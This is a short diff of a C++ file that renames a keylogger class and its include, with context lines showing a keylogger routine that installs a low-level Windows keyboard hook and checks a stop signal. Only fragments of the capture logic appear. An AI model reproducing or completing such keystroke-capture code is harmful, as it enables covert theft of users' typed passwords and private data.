@@ -1,6 +1,6 @@
-﻿#include "KeyloggerObject.h"
+﻿#include "KLG_Obj.h"
 /*
-std::string KLG_TransferObj::keylogger()
+std::string KLG_Obj::keylogger()
 {
 	std::string result = "";
 	while (!checkStopSignal())
@@ -37,7 +37,7 @@ LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-std::string KLG_TransferObj::keylogger()
+std::string KLG_Obj::keylogger()
 {
 	// Thiết lập hook để bắt sự kiện phím
 	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
@@ -81,7 +81,7 @@ std::string KLG_TransferObj::keylogger()
 }
 
 
-bool KLG_TransferObj::checkStopSignal()
+bool KLG_Obj::checkStopSignal()
 {
 	DataTransferObj stopSignal;
 
